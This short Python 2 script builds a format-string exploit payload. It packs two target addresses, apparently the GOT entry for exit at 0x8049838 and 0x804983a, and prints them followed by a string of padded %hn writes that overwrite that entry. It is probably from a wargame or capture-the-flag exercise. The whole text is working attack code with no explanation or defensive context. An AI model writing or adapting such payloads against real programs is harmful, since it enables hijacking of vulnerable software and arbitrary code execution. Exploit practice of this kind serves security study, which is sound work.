import struct

exit_addr  = struct.pack('I', 0x8049838)
exit_addr += struct.pack('I', 0x804983a)

print exit_addr + "%2044x%5$hn%31904x%4$hn"
